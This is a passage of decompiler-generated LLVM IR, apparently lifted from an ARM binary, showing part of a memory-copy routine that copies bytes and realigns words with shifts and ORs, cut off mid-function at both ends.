  store i1 %v7_18cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18cac, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_18cb4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_18cb0 = load i8*, i8** %stack_var_-8, align 4
  %v4_18cb0 = ptrtoint i8* %v3_18cb0 to i32
  store i32 %v4_18cb0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_18cb4 = phi i32 [ %v0_18cb4.pre, %bb140.bb142_crit_edge ], [ %v8_18c1c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_18cac, i32 %v0_18cb4)
  %v0_18cb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18cb8 = add i32 %v0_18cb8, -2
  %v3_18cb8 = sub i32 1, %v0_18cb8
  %v4_18cb8 = and i32 %v3_18cb8, %v0_18cb8
  %v5_18cb8 = icmp slt i32 %v4_18cb8, 0
  store i1 %v5_18cb8, i1* %cpsr_v.global-to-local, align 1
  %v6_18cb8 = icmp slt i32 %v1_18cb8, 0
  store i1 %v6_18cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_18cb8 = icmp eq i32 %v0_18cb8, 2
  store i1 %v7_18cb8, i1* %cpsr_z.global-to-local, align 1
  %v0_18cbc = load i32, i32* @r1, align 4
  %v1_18cbc = inttoptr i32 %v0_18cbc to i8*
  %v2_18cbc = load i8, i8* %v1_18cbc, align 1
  %v5_18cbc = add i32 %v0_18cbc, 1
  store i32 %v5_18cbc, i32* %r1.global-to-local, align 4
  %v2_18cc0 = load i32, i32* @r0, align 4
  %v3_18cc0 = inttoptr i32 %v2_18cc0 to i8*
  store i8 %v2_18cbc, i8* %v3_18cc0, align 1
  %v4_18cc0 = load i32, i32* @r0, align 4
  %v5_18cc0 = add i32 %v4_18cc0, 1
  store i32 %v5_18cc0, i32* %r0.global-to-local, align 4
  %v0_18cc4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18cc4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18cc4 = xor i1 %v0_18cc4, %v1_18cc4
  br i1 %v2_18cc4, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_18cc4 = load i32, i32* %r1.global-to-local, align 4
  %v4_18cc4 = inttoptr i32 %v3_18cc4 to i8*
  %v5_18cc4 = load i8, i8* %v4_18cc4, align 1
  %v8_18cc4 = add i32 %v3_18cc4, 1
  store i32 %v8_18cc4, i32* %r1.global-to-local, align 4
  %v6_18cc8 = inttoptr i32 %v5_18cc0 to i8*
  store i8 %v5_18cc4, i8* %v6_18cc8, align 1
  %v7_18cc8 = load i32, i32* %r0.global-to-local, align 4
  %v8_18cc8 = add i32 %v7_18cc8, 1
  store i32 %v8_18cc8, i32* %r0.global-to-local, align 4
  %v1_18ccc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18ccc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_18cd0 = phi i32 [ %v8_18cc8, %bb143 ], [ %v5_18cc0, %bb142 ]
  %v2_18cd0 = phi i1 [ %v2_18ccc.pre, %bb143 ], [ %v1_18cc4, %bb142 ]
  %v1_18cd0 = phi i1 [ %v1_18ccc.pre, %bb143 ], [ %v0_18cc4, %bb142 ]
  %v0_18ccc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18ccc = xor i1 %v2_18cd0, %v1_18cd0
  %v4_18ccc = or i1 %v0_18ccc, %v3_18ccc
  br i1 %v4_18ccc, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_18ccc = load i32, i32* %r1.global-to-local, align 4
  %v6_18ccc = inttoptr i32 %v5_18ccc to i8*
  %v7_18ccc = load i8, i8* %v6_18ccc, align 1
  %v10_18ccc = add i32 %v5_18ccc, 1
  store i32 %v10_18ccc, i32* %r1.global-to-local, align 4
  %v8_18cd0 = inttoptr i32 %v7_18cd0 to i8*
  store i8 %v7_18ccc, i8* %v8_18cd0, align 1
  %v9_18cd0 = load i32, i32* %r0.global-to-local, align 4
  %v10_18cd0 = add i32 %v9_18cd0, 1
  store i32 %v10_18cd0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_18cd4 = load i8*, i8** %stack_var_-8, align 4
  %v3_18cd4 = ptrtoint i8* %v2_18cd4 to i32
  store i32 %v3_18cd4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_18c1c)
  %v0_18cdc.pre = load i32, i32* @ip, align 4
  %v0_18ce4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_18ce8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_18cdc

dec_label_pc_18cdc:                               ; preds = %dec_label_pc_18c28, %.thread126
  %v2_18ce8 = phi i32 [ %v1_18c10, %dec_label_pc_18c28 ], [ %v2_18ce8.pre, %.thread126 ]
  %v0_18ce4 = phi i32 [ %v0_18c10, %dec_label_pc_18c28 ], [ %v0_18ce4.pre, %.thread126 ]
  %v0_18cdc = phi i32 [ %v1_18c28, %dec_label_pc_18c28 ], [ %v0_18cdc.pre, %.thread126 ]
  %v1_18cdc = sub i32 4, %v0_18cdc
  store i32 %v1_18cdc, i32* @ip, align 4
  %v1_18ce0 = add i32 %v1_18cdc, -2
  %v3_18ce0 = sub i32 1, %v1_18cdc
  %v4_18ce0 = and i32 %v3_18ce0, %v1_18cdc
  %v5_18ce0 = icmp slt i32 %v4_18ce0, 0
  store i1 %v5_18ce0, i1* %cpsr_v.global-to-local, align 1
  %v6_18ce0 = icmp slt i32 %v1_18ce0, 0
  store i1 %v6_18ce0, i1* %cpsr_n.global-to-local, align 1
  %v7_18ce0 = icmp eq i32 %v1_18cdc, 2
  store i1 %v7_18ce0, i1* %cpsr_z.global-to-local, align 1
  %v1_18ce4 = inttoptr i32 %v0_18ce4 to i8*
  %v2_18ce4 = load i8, i8* %v1_18ce4, align 1
  %v3_18ce4 = zext i8 %v2_18ce4 to i32
  store i32 %v3_18ce4, i32* @r3, align 4
  %v5_18ce4 = add i32 %v0_18ce4, 1
  store i32 %v5_18ce4, i32* @r1, align 4
  %v3_18ce8 = inttoptr i32 %v2_18ce8 to i8*
  store i8 %v2_18ce4, i8* %v3_18ce8, align 1
  %v4_18ce8 = load i32, i32* @r0, align 4
  %v5_18ce8 = add i32 %v4_18ce8, 1
  store i32 %v5_18ce8, i32* @r0, align 4
  %v0_18cec = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18cec = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18cec = xor i1 %v0_18cec, %v1_18cec
  br i1 %v2_18cec, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_18cdc
  %v3_18cec = load i32, i32* @r1, align 4
  %v4_18cec = inttoptr i32 %v3_18cec to i8*
  %v5_18cec = load i8, i8* %v4_18cec, align 1
  %v6_18cec = zext i8 %v5_18cec to i32
  store i32 %v6_18cec, i32* @r3, align 4
  %v8_18cec = add i32 %v3_18cec, 1
  store i32 %v8_18cec, i32* @r1, align 4
  %v6_18cf0 = inttoptr i32 %v5_18ce8 to i8*
  store i8 %v5_18cec, i8* %v6_18cf0, align 1
  %v7_18cf0 = load i32, i32* @r0, align 4
  %v8_18cf0 = add i32 %v7_18cf0, 1
  store i32 %v8_18cf0, i32* @r0, align 4
  %v1_18cf4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18cf4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_18cdc, %bb145
  %v7_18cf8 = phi i32 [ %v8_18cf0, %bb145 ], [ %v5_18ce8, %dec_label_pc_18cdc ]
  %v2_18cf8 = phi i1 [ %v2_18cf4.pre, %bb145 ], [ %v1_18cec, %dec_label_pc_18cdc ]
  %v1_18cf8 = phi i1 [ %v1_18cf4.pre, %bb145 ], [ %v0_18cec, %dec_label_pc_18cdc ]
  %v0_18cf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18cf4 = xor i1 %v2_18cf8, %v1_18cf8
  %v4_18cf4 = or i1 %v0_18cf4, %v3_18cf4
  br i1 %v4_18cf4, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_18cf4 = load i32, i32* @r1, align 4
  %v6_18cf4 = inttoptr i32 %v5_18cf4 to i8*
  %v7_18cf4 = load i8, i8* %v6_18cf4, align 1
  %v8_18cf4 = zext i8 %v7_18cf4 to i32
  store i32 %v8_18cf4, i32* @r3, align 4
  %v10_18cf4 = add i32 %v5_18cf4, 1
  store i32 %v10_18cf4, i32* @r1, align 4
  %v8_18cf8 = inttoptr i32 %v7_18cf8 to i8*
  store i8 %v7_18cf4, i8* %v8_18cf8, align 1
  %v9_18cf8 = load i32, i32* @r0, align 4
  %v10_18cf8 = add i32 %v9_18cf8, 1
  store i32 %v10_18cf8, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_18e2c77 = phi i32 [ %v10_18cf8, %bb146 ], [ %v7_18cf8, %.thread127 ]
  %v0_18cfc = load i32, i32* %r2.global-to-local, align 4
  %v1_18cfc = load i32, i32* @ip, align 4
  %v2_18cfc = sub i32 %v0_18cfc, %v1_18cfc
  store i32 %v2_18cfc, i32* %r2.global-to-local, align 4
  %v4_18cfc = xor i32 %v1_18cfc, %v0_18cfc
  %v5_18cfc = xor i32 %v2_18cfc, %v0_18cfc
  %v6_18cfc = and i32 %v5_18cfc, %v4_18cfc
  %v7_18cfc = icmp slt i32 %v6_18cfc, 0
  store i1 %v7_18cfc, i1* %cpsr_v.global-to-local, align 1
  %v8_18cfc = icmp slt i32 %v2_18cfc, 0
  store i1 %v8_18cfc, i1* %cpsr_n.global-to-local, align 1
  %v9_18cfc = icmp eq i32 %v0_18cfc, %v1_18cfc
  store i1 %v9_18cfc, i1* %cpsr_z.global-to-local, align 1
  %v2_18d00 = xor i1 %v8_18cfc, %v7_18cfc
  br i1 %v2_18d00, label %bb140, label %dec_label_pc_18d04

dec_label_pc_18d04:                               ; preds = %.thread128
  %v0_18d04 = load i32, i32* @r1, align 4
  %v1_18d04 = urem i32 %v0_18d04, 4
  store i32 %v1_18d04, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18d04 = icmp eq i32 %v1_18d04, 0
  store i1 %v2_18d04, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_18d04 to i2
  br i1 %v2_18d04, label %dec_label_pc_18c38, label %dec_label_pc_18d0c

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18c30, %dec_label_pc_18d04
  %v0_18e2c76 = phi i32 [ %v1_18c10, %dec_label_pc_18c30 ], [ %v0_18e2c77, %dec_label_pc_18d04 ]
  %v0_18d94 = phi i32 [ %v2_18c20, %dec_label_pc_18c30 ], [ %v2_18cfc, %dec_label_pc_18d04 ]
  %v0_18d14.off0 = phi i2 [ %extract.t, %dec_label_pc_18c30 ], [ %extract.t131, %dec_label_pc_18d04 ]
  %v0_18d0c = phi i32 [ %v0_18c10, %dec_label_pc_18c30 ], [ %v0_18d04, %dec_label_pc_18d04 ]
  %v1_18d0c = and i32 %v0_18d0c, -4
  store i32 %v1_18d0c, i32* %r1.global-to-local, align 4
  %v1_18d10 = inttoptr i32 %v1_18d0c to i32*
  %v2_18d10 = load i32, i32* %v1_18d10, align 4
  store i32 %v2_18d10, i32* %lr.global-to-local, align 4
  %v4_18d10 = add i32 %v1_18d0c, 4
  store i32 %v4_18d10, i32* %r1.global-to-local, align 4
  %v1_18d8c = add i32 %v0_18d94, -12
  %v3_18d8c = sub i32 11, %v0_18d94
  %v4_18d8c = and i32 %v3_18d8c, %v0_18d94
  %v5_18d8c = icmp slt i32 %v4_18d8c, 0
  store i1 %v5_18d8c, i1* %cpsr_v.global-to-local, align 1
  %v6_18d8c = icmp slt i32 %v1_18d8c, 0
  store i1 %v6_18d8c, i1* %cpsr_n.global-to-local, align 1
  %v7_18d8c = icmp eq i32 %v0_18d94, 12
  store i1 %v7_18d8c, i1* %cpsr_z.global-to-local, align 1
  %v2_18d90 = xor i1 %v6_18d8c, %v5_18d8c
  switch i2 %v0_18d14.off0, label %dec_label_pc_18d20 [
    i2 -1, label %dec_label_pc_18df8
    i2 -2, label %dec_label_pc_18d8c
  ]

dec_label_pc_18d20:                               ; preds = %dec_label_pc_18d0c
  br i1 %v2_18d90, label %dec_label_pc_18d6c, label %dec_label_pc_18d28

dec_label_pc_18d28:                               ; preds = %dec_label_pc_18d20
  store i32 %v1_18d8c, i32* %r2.global-to-local, align 4
  %v3_18d2c = load i32, i32* @r4, align 4
  store i32 %v3_18d2c, i32* %stack_var_-16, align 4
  %v6_18d2c = load i32, i32* @r5, align 4
  store i32 %v6_18d2c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18d30

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18d30.dec_label_pc_18d30_crit_edge, %dec_label_pc_18d28
  %v0_18d54 = phi i32 [ %v12_18d54, %dec_label_pc_18d30.dec_label_pc_18d30_crit_edge ], [ %v0_18e2c76, %dec_label_pc_18d28 ]
  %v0_18d34 = phi i32 [ %v0_18d34.pre, %dec_label_pc_18d30.dec_label_pc_18d30_crit_edge ], [ %v4_18d10, %dec_label_pc_18d28 ]
  %v0_18d30 = phi i32 [ %v0_18d30.pre, %dec_label_pc_18d30.dec_label_pc_18d30_crit_edge ], [ %v2_18d10, %dec_label_pc_18d28 ]
  %v3_18d30 = udiv i32 %v0_18d30, 256
  %v1_18d34 = inttoptr i32 %v0_18d34 to i32*
  %v2_18d34 = load i32, i32* %v1_18d34, align 4
  store i32 %v2_18d34, i32* %r4.global-to-local, align 4
  %v3_18d34 = add i32 %v0_18d34, 4
  %v4_18d34 = inttoptr i32 %v3_18d34 to i32*
  %v5_18d34 = load i32, i32* %v4_18d34, align 4
  store i32 %v5_18d34, i32* %r5.global-to-local, align 4
  %v6_18d34 = add i32 %v0_18d34, 8
  %v7_18d34 = inttoptr i32 %v6_18d34 to i32*
  %v8_18d34 = load i32, i32* %v7_18d34, align 4
  store i32 %v8_18d34, i32* %ip.global-to-local, align 4
  %v9_18d34 = add i32 %v0_18d34, 12
  %v10_18d34 = inttoptr i32 %v9_18d34 to i32*
  %v11_18d34 = load i32, i32* %v10_18d34, align 4
  store i32 %v11_18d34, i32* %lr.global-to-local, align 4
  %v12_18d34 = add i32 %v0_18d34, 16
  store i32 %v12_18d34, i32* %r1.global-to-local, align 4
  %v4_18d38 = mul i32 %v2_18d34, 16777216
  %v5_18d38 = or i32 %v4_18d38, %v3_18d30
  store i32 %v5_18d38, i32* @r3, align 4
  %v3_18d3c = udiv i32 %v2_18d34, 256
  %v4_18d40 = mul i32 %v5_18d34, 16777216
  %v5_18d40 = or i32 %v4_18d40, %v3_18d3c
  store i32 %v5_18d40, i32* %r4.global-to-local, align 4
  %v3_18d44 = udiv i32 %v5_18d34, 256
  %v4_18d48 = mul i32 %v8_18d34, 16777216
  %v5_18d48 = or i32 %v4_18d48, %v3_18d44
  store i32 %v5_18d48, i32* %r5.global-to-local, align 4
  %v3_18d4c = udiv i32 %v8_18d34, 256
  %v4_18d50 = mul i32 %v11_18d34, 16777216
  %v5_18d50 = or i32 %v4_18d50, %v3_18d4c
  store i32 %v5_18d50, i32* @ip, align 4
  %v1_18d54 = inttoptr i32 %v0_18d54 to i32*
  store i32 %v5_18d38, i32* %v1_18d54, align 4
  %v3_18d54 = add i32 %v0_18d54, 4
  %v4_18d54 = inttoptr i32 %v3_18d54 to i32*
  %v5_18d54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18d54, i32* %v4_18d54, align 4
  %v6_18d54 = add i32 %v0_18d54, 8
  %v7_18d54 = inttoptr i32 %v6_18d54 to i32*
  %v8_18d54 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18d54, i32* %v7_18d54, align 4
  %v9_18d54 = add i32 %v0_18d54, 12
  %v10_18d54 = inttoptr i32 %v9_18d54 to i32*
  %v11_18d54 = load i32, i32* @ip, align 4
  store i32 %v11_18d54, i32* %v10_18d54, align 4
  %v12_18d54 = add i32 %v0_18d54, 16
  store i32 %v12_18d54, i32* @r0, align 4
  %v0_18d58 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d58 = add i32 %v0_18d58, -16
  store i32 %v1_18d58, i32* %r2.global-to-local, align 4
  %v3_18d58 = sub i32 15, %v0_18d58
  %v4_18d58 = and i32 %v3_18d58, %v0_18d58
  %v5_18d58 = icmp slt i32 %v4_18d58, 0
  %v6_18d58 = icmp slt i32 %v1_18d58, 0
  %v2_18d5c = xor i1 %v6_18d58, %v5_18d58
  br i1 %v2_18d5c, label %dec_label_pc_18d60, label %dec_label_pc_18d30.dec_label_pc_18d30_crit_edge

dec_label_pc_18d30.dec_label_pc_18d30_crit_edge:  ; preds = %dec_label_pc_18d30
  %v0_18d30.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18d34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d30

dec_label_pc_18d60:                               ; preds = %dec_label_pc_18d30
  %v2_18d60 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18d60, i32* @r4, align 4
  %v5_18d60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18d60, i32* @r5, align 4
  %v1_18d64 = add i32 %v0_18d58, -4
  store i32 %v1_18d64, i32* %r2.global-to-local, align 4
  %v3_18d64 = add i32 %v0_18d58, 2147483632
  %v4_18d64 = and i32 %v1_18d64, %v3_18d64
  %v5_18d64 = icmp slt i32 %v4_18d64, 0
  store i1 %v5_18d64, i1* %cpsr_v.global-to-local, align 1
  %v6_18d64 = icmp slt i32 %v1_18d64, 0
  store i1 %v6_18d64, i1* %cpsr_n.global-to-local, align 1
  %v7_18d64 = icmp eq i32 %v1_18d64, 0
  store i1 %v7_18d64, i1* %cpsr_z.global-to-local, align 1
  %v2_18d68 = xor i1 %v6_18d64, %v5_18d64
  br i1 %v2_18d68, label %dec_label_pc_18d84, label %dec_label_pc_18d6c

dec_label_pc_18d6c:                               ; preds = %dec_label_pc_18d60, %dec_label_pc_18d20, %dec_label_pc_18d6c
  %v1_18d78 = phi i32 [ %v4_18d78, %dec_label_pc_18d6c ], [ %v12_18d54, %dec_label_pc_18d60 ], [ %v0_18e2c76, %dec_label_pc_18d20 ]
  %v0_18d6c = load i32, i32* %lr.global-to-local, align 4
  %v3_18d6c = udiv i32 %v0_18d6c, 256
  store i32 %v3_18d6c, i32* %ip.global-to-local, align 4
  %v0_18d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d70 = inttoptr i32 %v0_18d70 to i32*
  %v2_18d70 = load i32, i32* %v1_18d70, align 4
  store i32 %v2_18d70, i32* %lr.global-to-local, align 4
  %v4_18d70 = add i32 %v0_18d70, 4
  store i32 %v4_18d70, i32* %r1.global-to-local, align 4
  %v4_18d74 = mul i32 %v2_18d70, 16777216
  %v5_18d74 = or i32 %v4_18d74, %v3_18d6c
  store i32 %v5_18d74, i32* @ip, align 4
  %v2_18d78 = inttoptr i32 %v1_18d78 to i32*
  store i32 %v5_18d74, i32* %v2_18d78, align 4
  %v3_18d78 = load i32, i32* @r0, align 4
  %v4_18d78 = add i32 %v3_18d78, 4
  store i32 %v4_18d78, i32* @r0, align 4
  %v0_18d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_18d7c = add i32 %v0_18d7c, -4
  store i32 %v1_18d7c, i32* %r2.global-to-local, align 4
  %v3_18d7c = sub i32 3, %v0_18d7c
  %v4_18d7c = and i32 %v3_18d7c, %v0_18d7c
  %v5_18d7c = icmp slt i32 %v4_18d7c, 0
  %v6_18d7c = icmp slt i32 %v1_18d7c, 0
  %v2_18d80 = xor i1 %v6_18d7c, %v5_18d7c
  br i1 %v2_18d80, label %dec_label_pc_18d84.loopexit, label %dec_label_pc_18d6c

dec_label_pc_18d84.loopexit:                      ; preds = %dec_label_pc_18d6c
  %v7_18d7c = icmp eq i32 %v0_18d7c, 4
  store i1 %v5_18d7c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18d7c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18d7c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18d84

dec_label_pc_18d84:                               ; preds = %dec_label_pc_18d84.loopexit, %dec_label_pc_18d60
  %v0_18cac59 = phi i32 [ %v1_18d7c, %dec_label_pc_18d84.loopexit ], [ %v1_18d64, %dec_label_pc_18d60 ]
  %v0_18d84 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d84 = add i32 %v0_18d84, -3
  store i32 %v1_18d84, i32* @r1, align 4
  br label %bb140

dec_label_pc_18d8c:                               ; preds = %dec_label_pc_18d0c
  br i1 %v2_18d90, label %dec_label_pc_18dd8, label %dec_label_pc_18d94

dec_label_pc_18d94:                               ; preds = %dec_label_pc_18d8c
  store i32 %v1_18d8c, i32* %r2.global-to-local, align 4
  %v3_18d98 = load i32, i32* @r4, align 4
  store i32 %v3_18d98, i32* %stack_var_-16, align 4
  %v6_18d98 = load i32, i32* @r5, align 4
  store i32 %v6_18d98, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18d9c

dec_label_pc_18d9c:                               ; preds = %dec_label_pc_18d9c.dec_label_pc_18d9c_crit_edge, %dec_label_pc_18d94
  %v0_18dc0 = phi i32 [ %v12_18dc0, %dec_label_pc_18d9c.dec_label_pc_18d9c_crit_edge ], [ %v0_18e2c76, %dec_label_pc_18d94 ]
  %v0_18da0 = phi i32 [ %v0_18da0.pre, %dec_label_pc_18d9c.dec_label_pc_18d9c_crit_edge ], [ %v4_18d10, %dec_label_pc_18d94 ]
  %v0_18d9c = phi i32 [ %v0_18d9c.pre, %dec_label_pc_18d9c.dec_label_pc_18d9c_crit_edge ], [ %v2_18d10, %dec_label_pc_18d94 ]
  %v3_18d9c = udiv i32 %v0_18d9c, 65536
  %v1_18da0 = inttoptr i32 %v0_18da0 to i32*
  %v2_18da0 = load i32, i32* %v1_18da0, align 4
  store i32 %v2_18da0, i32* %r4.global-to-local, align 4
  %v3_18da0 = add i32 %v0_18da0, 4
  %v4_18da0 = inttoptr i32 %v3_18da0 to i32*
  %v5_18da0 = load i32, i32* %v4_18da0, align 4
  store i32 %v5_18da0, i32* %r5.global-to-local, align 4
  %v6_18da0 = add i32 %v0_18da0, 8
  %v7_18da0 = inttoptr i32 %v6_18da0 to i32*
  %v8_18da0 = load i32, i32* %v7_18da0, align 4
  store i32 %v8_18da0, i32* %ip.global-to-local, align 4
  %v9_18da0 = add i32 %v0_18da0, 12
  %v10_18da0 = inttoptr i32 %v9_18da0 to i32*
  %v11_18da0 = load i32, i32* %v10_18da0, align 4
  store i32 %v11_18da0, i32* %lr.global-to-local, align 4
  %v12_18da0 = add i32 %v0_18da0, 16
  store i32 %v12_18da0, i32* %r1.global-to-local, align 4
  %v4_18da4 = mul i32 %v2_18da0, 65536
  %v5_18da4 = or i32 %v4_18da4, %v3_18d9c
  store i32 %v5_18da4, i32* @r3, align 4
  %v3_18da8 = udiv i32 %v2_18da0, 65536
  %v4_18dac = mul i32 %v5_18da0, 65536
  %v5_18dac = or i32 %v4_18dac, %v3_18da8
  store i32 %v5_18dac, i32* %r4.global-to-local, align 4
  %v3_18db0 = udiv i32 %v5_18da0, 65536
  %v4_18db4 = mul i32 %v8_18da0, 65536
  %v5_18db4 = or i32 %v4_18db4, %v3_18db0
  store i32 %v5_18db4, i32* %r5.global-to-local, align 4
  %v3_18db8 = udiv i32 %v8_18da0, 65536
  %v4_18dbc = mul i32 %v11_18da0, 65536
  %v5_18dbc = or i32 %v4_18dbc, %v3_18db8
  store i32 %v5_18dbc, i32* @ip, align 4
  %v1_18dc0 = inttoptr i32 %v0_18dc0 to i32*
  store i32 %v5_18da4, i32* %v1_18dc0, align 4
  %v3_18dc0 = add i32 %v0_18dc0, 4
  %v4_18dc0 = inttoptr i32 %v3_18dc0 to i32*
  %v5_18dc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18dc0, i32* %v4_18dc0, align 4
  %v6_18dc0 = add i32 %v0_18dc0, 8
  %v7_18dc0 = inttoptr i32 %v6_18dc0 to i32*
  %v8_18dc0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18dc0, i32* %v7_18dc0, align 4
  %v9_18dc0 = add i32 %v0_18dc0, 12
  %v10_18dc0 = inttoptr i32 %v9_18dc0 to i32*
  %v11_18dc0 = load i32, i32* @ip, align 4
  store i32 %v11_18dc0, i32* %v10_18dc0, align 4
  %v12_18dc0 = add i32 %v0_18dc0, 16
  store i32 %v12_18dc0, i32* @r0, align 4
  %v0_18dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18dc4 = add i32 %v0_18dc4, -16
  store i32 %v1_18dc4, i32* %r2.global-to-local, align 4
  %v3_18dc4 = sub i32 15, %v0_18dc4
  %v4_18dc4 = and i32 %v3_18dc4, %v0_18dc4
  %v5_18dc4 = icmp slt i32 %v4_18dc4, 0
  %v6_18dc4 = icmp slt i32 %v1_18dc4, 0
  %v2_18dc8 = xor i1 %v6_18dc4, %v5_18dc4
  br i1 %v2_18dc8, label %dec_label_pc_18dcc, label %dec_label_pc_18d9c.dec_label_pc_18d9c_crit_edge

dec_label_pc_18d9c.dec_label_pc_18d9c_crit_edge:  ; preds = %dec_label_pc_18d9c
  %v0_18d9c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18da0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d9c

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18d9c
  %v2_18dcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18dcc, i32* @r4, align 4
  %v5_18dcc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18dcc, i32* @r5, align 4
  %v1_18dd0 = add i32 %v0_18dc4, -4
  store i32 %v1_18dd0, i32* %r2.global-to-local, align 4
  %v3_18dd0 = add i32 %v0_18dc4, 2147483632
  %v4_18dd0 = and i32 %v1_18dd0, %v3_18dd0
  %v5_18dd0 = icmp slt i32 %v4_18dd0, 0
  store i1 %v5_18dd0, i1* %cpsr_v.global-to-local, align 1
  %v6_18dd0 = icmp slt i32 %v1_18dd0, 0
  store i1 %v6_18dd0, i1* %cpsr_n.global-to-local, align 1
  %v7_18dd0 = icmp eq i32 %v1_18dd0, 0
  store i1 %v7_18dd0, i1* %cpsr_z.global-to-local, align 1
  %v2_18dd4 = xor i1 %v6_18dd0, %v5_18dd0
  br i1 %v2_18dd4, label %dec_label_pc_18df0, label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %dec_label_pc_18dcc, %dec_label_pc_18d8c, %dec_label_pc_18dd8
  %v1_18de4 = phi i32 [ %v4_18de4, %dec_label_pc_18dd8 ], [ %v12_18dc0, %dec_label_pc_18dcc ], [ %v0_18e2c76, %dec_label_pc_18d8c ]
  %v0_18dd8 = load i32, i32* %lr.global-to-local, align 4
  %v3_18dd8 = udiv i32 %v0_18dd8, 65536
  store i32 %v3_18dd8, i32* %ip.global-to-local, align 4
  %v0_18ddc = load i32, i32* %r1.global-to-local, align 4
  %v1_18ddc = inttoptr i32 %v0_18ddc to i32*
  %v2_18ddc = load i32, i32* %v1_18ddc, align 4
  store i32 %v2_18ddc, i32* %lr.global-to-local, align 4
  %v4_18ddc = add i32 %v0_18ddc, 4
  store i32 %v4_18ddc, i32* %r1.global-to-local, align 4
  %v4_18de0 = mul i32 %v2_18ddc, 65536
  %v5_18de0 = or i32 %v4_18de0, %v3_18dd8
  store i32 %v5_18de0, i32* @ip, align 4
  %v2_18de4 = inttoptr i32 %v1_18de4 to i32*
  store i32 %v5_18de0, i32* %v2_18de4, align 4
  %v3_18de4 = load i32, i32* @r0, align 4
  %v4_18de4 = add i32 %v3_18de4, 4
  store i32 %v4_18de4, i32* @r0, align 4
  %v0_18de8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18de8 = add i32 %v0_18de8, -4
  store i32 %v1_18de8, i32* %r2.global-to-local, align 4
  %v3_18de8 = sub i32 3, %v0_18de8
  %v4_18de8 = and i32 %v3_18de8, %v0_18de8
  %v5_18de8 = icmp slt i32 %v4_18de8, 0
  %v6_18de8 = icmp slt i32 %v1_18de8, 0
  %v2_18dec = xor i1 %v6_18de8, %v5_18de8
  br i1 %v2_18dec, label %dec_label_pc_18df0.loopexit, label %dec_label_pc_18dd8

dec_label_pc_18df0.loopexit:                      ; preds = %dec_label_pc_18dd8
  %v7_18de8 = icmp eq i32 %v0_18de8, 4
  store i1 %v5_18de8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18de8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18de8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18df0

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18df0.loopexit, %dec_label_pc_18dcc
  %v0_18cac60 = phi i32 [ %v1_18de8, %dec_label_pc_18df0.loopexit ], [ %v1_18dd0, %dec_label_pc_18dcc ]
  %v0_18df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18df0 = add i32 %v0_18df0, -2
  store i32 %v1_18df0, i32* @r1, align 4
  br label %bb140

dec_label_pc_18df8:                               ; preds = %dec_label_pc_18d0c
  br i1 %v2_18d90, label %dec_label_pc_18e44, label %dec_label_pc_18e00

dec_label_pc_18e00:                               ; preds = %dec_label_pc_18df8
  store i32 %v1_18d8c, i32* %r2.global-to-local, align 4
